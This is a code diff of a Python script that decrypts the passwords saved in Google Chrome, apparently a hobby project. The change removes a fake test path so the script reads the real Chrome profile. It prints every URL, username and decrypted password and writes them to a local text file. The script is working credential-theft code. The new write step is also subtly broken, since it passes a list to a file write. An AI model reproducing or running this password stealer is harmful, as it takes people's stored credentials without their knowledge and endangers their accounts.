@@ -10,13 +10,9 @@ from Cryptodome.Cipher import AES
 import shutil
 import csv
 
-#GLOBAL CONSTANT
+# #GLOBAL CONSTANT
 CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
 CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))
-
-#Fake Google Path
-CHROME_PATH_LOCAL_STATE="E:\Codeing\Python Language\Projects\Project_17\Fake Google Path\Local State"
-CHROME_PATH="E:\Codeing\Python Language\Projects\Project_17\Fake Google Path"
 
 
 def get_secret_key():
@@ -97,7 +93,12 @@ if __name__ == '__main__':
                             print("URL: %s\nUser Name: %s\nPassword: %s\n"%(url,username,decrypted_password))
                             print("*"*50)
                             #(5) Save into CSV 
-                            csv_writer.writerow([index,url,username,decrypted_password])
+                            # csv_writer.writerow([index,url,username,decrypted_password])
+                            File_Path="E:\Codeing\Python Language\Projects\Project_17\info.txt"
+                            with open(File_Path,'w+') as File:
+                                File.write([index,url,username,decrypted_password])
+                                
+                            
                     #Close database connection
                     cursor.close()
                     conn.close()
